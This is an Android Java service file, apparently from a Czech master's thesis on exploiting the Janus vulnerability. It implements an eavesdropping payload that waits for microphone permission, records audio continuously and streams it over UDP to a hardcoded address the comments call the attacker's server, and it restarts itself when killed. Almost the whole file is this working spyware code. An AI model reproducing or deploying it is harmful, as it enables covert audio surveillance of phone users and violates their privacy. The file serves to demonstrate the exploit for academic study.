// Tento kod je soucast diplomove prace Vyuziti zranitelnosti Janus na operacnim systemu Android
// Autor: Bc. Vit Soucek
//
// Zdroje: Uvedeny v komentarich u jednotlivych metod

package com.example.audioservice;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.media.audiofx.AcousticEchoCanceler;
import android.media.audiofx.NoiseSuppressor;
import android.os.IBinder;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;


public class EavesdropService extends Service {
    private String TAG = "AUDIO_SLUZBA";

    private String address = "10.0.2.2";
    private int port = 50005;

    AudioRecord recorder;

    private int sampleRate = 44100;
    private int channelConfig = AudioFormat.CHANNEL_IN_MONO;
    private int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
    private int minBufSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat) * 10;

    private volatile boolean status = true;

    /**
     * Constructor of the service. Empty.
     */
    public EavesdropService() {
        Log.e(TAG, "Constructor");
    }

    /**
     * Mandatory callback method called on the creation of the service.
     */
    @Override
    public void onCreate() {
        super.onCreate();
        Log.e(TAG, "onCreate");
    }

    /**
     * Mandatory callback method called on bind of the service.
     *
     * @param intent Intent the service is called with
     * @return Null -- the method is not needed
     */
    @Override
    public IBinder onBind(Intent intent) {
        Log.e(TAG, "onBind");
        return null;
    }

    /**
     * Mandatory callback method called on unbind of the service.
     *
     * @param intent Intent the method is called with
     * @return Whatever this method returns in the super class.
     */
    @Override
    public boolean onUnbind(Intent intent) {
        Log.e(TAG, "onUnbind");
        return super.onUnbind(intent);
    }

    /**
     * Main method of the eavesdrop. Run when statService is
     * called from somewhere else.
     * <p>
     * The method creates a thread that manages all the
     * eavesdropping functionality.
     * First, the thread waits from appropriate permissions.
     * Then is initializes all the objects necessary for audio recording.
     * After that there is a loop where data are being received from
     * the microphone and sent away to the attacker's server.
     * After the thread drops out of the loop, all recording
     * objects are freed.
     *
     * The initialization of the recording objects and
     * the main recording loop and are based on the
     * answer to the Stackoverflow.com question
     * 'Stream Live Android Audio to Server'.
     * Answer by chuckliddell0, available at:
     * https://stackoverflow.com/a/15694209/6136143
     *
     * @param intent  Intent this method is called with
     * @param flags   Inner parameter of the Android service system
     * @param startId Inner parameter of the Android service system
     * @return START_STICKY so that the system restarts the service
     * when the app is killed
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e(TAG, "onStartCommand");
        Thread streamThread = new Thread(new Runnable() {

            @Override
            public void run() {

                waitForPermissions();

                DatagramSocket socket;
                try {
                    socket = new DatagramSocket();
                } catch (SocketException e) {
                    Log.e(TAG, "Unable to create socket");
                    e.printStackTrace();
                    return;
                }
                Log.d(TAG, "Socket Created");

                byte[] buffer = new byte[minBufSize];

                Log.d(TAG, "Buffer created of size " + minBufSize);

                DatagramPacket packet;
                final InetAddress destination;
                try {
                    destination = InetAddress.getByName(address);
                } catch (UnknownHostException e) {
                    Log.e(TAG, "Unknown destination address");
                    e.printStackTrace();
                    return;
                }
                Log.d(TAG, "Address retrieved");

                recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, minBufSize);

                // Wait until the AudioRecord is free to initialize
                while (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                    Log.i(TAG, "Waiting for recorder initialization");
                    recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, minBufSize);
                    try {
                        TimeUnit.SECONDS.sleep(2);
                    } catch (InterruptedException ignored) {
                    }
                }

                Log.d(TAG, "Recorder initialized");

                // If available, create object improving the sound quality
                if (AcousticEchoCanceler.isAvailable()) {
                    AcousticEchoCanceler.create(recorder.getAudioSessionId());
                    Log.i(TAG, "Creating acoustic echo canceller");
                }
                if (NoiseSuppressor.isAvailable()) {
                    NoiseSuppressor.create(recorder.getAudioSessionId());
                    Log.i(TAG, "Creating noise suppressor");
                }

                recorder.startRecording();

                while (status) {

                    // Read the data from the microphone into the buffer
                    int read = recorder.read(buffer, 0, buffer.length);

                    // Wrap the buffer to the packet
                    packet = new DatagramPacket(buffer, read, destination, port);

                    try {
                        socket.send(packet);
                    } catch (IOException e) {
                        continue;
                    }

                    // Clear the buffer
                    Arrays.fill(buffer, (byte) 0);
                }

                Log.e(TAG, "Status is false");

                // Free te initialized objects
                if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
                    recorder.stop();
                    recorder.release();
                }
            }
        });

        // Start the main thread
        streamThread.start();

        // START_STICKY: the service will be restarted when the app is killed
        return START_STICKY;
    }

    /**
     * Method called when the service is being removed.
     * Make the recording loop of the main thread stop.
     */
    @Override
    public void onDestroy() {
        status = false;
        super.onDestroy();
    }

    /**
     * Method called when the service's app is killed
     *
     * @param rootIntent Intent the method is called with
     */
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.e(TAG, "Task removed");
        status = false;
    }

    /**
     * Wait until the users has granted necessary permissions.
     * Only RECORD_AUDIO is needed, the permission INTERNET
     * is acquired automatically.
     *
     * Based on the answer to the Stackoverflow.com question
     * 'Android Studio asking for permission check after permission checked'.
     * Answer by rafsanahmad007, available at:
     * https://stackoverflow.com/a/43676323/6136143
     */
    public void waitForPermissions() {
        Log.e(TAG, "Waiting for permission to record audio...");
        while (this.checkCallingOrSelfPermission(Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
        }
        Log.e(TAG, "Permission granted");
    }
}
